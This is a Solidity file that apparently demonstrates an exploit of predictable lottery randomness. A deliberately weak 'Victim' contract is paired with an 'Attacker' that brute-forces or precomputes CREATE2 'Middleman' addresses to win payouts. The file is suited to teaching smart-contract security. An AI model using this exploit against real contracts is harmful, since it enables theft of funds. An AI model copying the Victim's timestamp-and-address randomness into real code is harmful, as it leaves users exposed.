// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

import "@openzeppelin/contracts/proxy/Clones.sol";

contract Victim {
    uint256 private seed;

    constructor(uint _seed) {
        seed = _seed;
    }

    function lottery() public payable {
        uint256 random = (block.timestamp + 
            uint160(msg.sender) + 
            seed) % 10;

        if (random == 5 && msg.value == 1 ether) {
            payable(msg.sender).transfer(9 ether);
        }
    }
}

contract Middleman {
    receive() external payable {}
    function attack(address _victim) public payable {
        Victim(_victim).lottery{value: 1 ether}();
        payable(msg.sender).transfer(address(this).balance);
    }
}

contract Attacker {
    event AttackStarted(address middlemanAddress, uint nonce);

    receive() external payable {}

    function deployAndCalcRNAttack(
        uint256 _seed,
        address _victim
    ) public payable {
        uint nonce;
        while (true) {
            address middlemanAddress = address(new Middleman());
            uint256 random = (block.timestamp +
                uint160(middlemanAddress) +
                _seed) % 10;
            if (random == 5) {
                Middleman(payable(middlemanAddress)).attack
                {value: 1 ether}(
                    _victim
                );
                payable(msg.sender).transfer(address(this).balance);
                emit AttackStarted(middlemanAddress, nonce);
                break;
            }
            ++nonce;
        }
    }

    function predictAndCalcRNAttack(
        uint256 _seed,
        address _victim
    ) public payable {
        bytes memory bytecode = type(Middleman).creationCode;
        uint nonce;
        while (true) {
            bytes32 hash = keccak256(
                abi.encodePacked(
                    bytes1(0xff),
                    address(this),
                    nonce,
                    keccak256(bytecode)
                )
            );
            address middlemanAddress = address(uint160(uint(hash)));
            uint256 random = (block.timestamp +
                uint160(middlemanAddress) +
                _seed) % 10;
            if (random == 5) {
                Middleman middleman;
                uint size;
                assembly {
                    size := extcodesize(middlemanAddress)
                }
                if (size == 0) {
                    middleman = new Middleman{salt: bytes32(nonce)}();
                } else {
                    middleman = Middleman(payable(middlemanAddress));
                }

                middleman.attack{value: 1 ether}(_victim);
                payable(msg.sender).transfer(address(this).balance);
                emit AttackStarted(middlemanAddress, nonce);
                break;
            }
            unchecked {
                ++nonce;
            }
        }
    }
}
